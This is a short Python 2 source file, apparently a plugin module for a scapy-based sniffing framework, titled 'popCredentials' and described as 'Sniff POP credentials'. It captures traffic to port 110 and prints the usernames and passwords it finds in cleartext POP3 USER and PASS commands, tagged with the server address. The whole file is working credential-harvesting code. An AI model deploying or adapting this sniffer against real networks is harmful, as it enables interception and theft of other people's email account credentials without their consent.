#!/usr/bin/python
# -*- coding: utf-8 -*-

from scapy.all import *

class module:

    def processPacket(self, packet):
        if packet.payload.dport == 110:
            data = packet.payload.payload.payload.fields["load"]
            if data.lower().startswith("user "):
                print "[+] POP user for %s : %s" % (packet.payload.dst,
                        data.lower().replace("user ", "").rstrip())
            if data.lower().startswith("pass "):
                print "[+] POP pass for %s : %s" % (packet.payload.dst,
                        data.lower().replace("pass ", "").rstrip())

    def getDescription(self):
        return "%s (%s)" % (self.moduleName, self.moduleDescription) 

    def __init__(self):
        self.moduleName = "popCredentials"
        self.moduleDescription = "Sniff POP credentials"
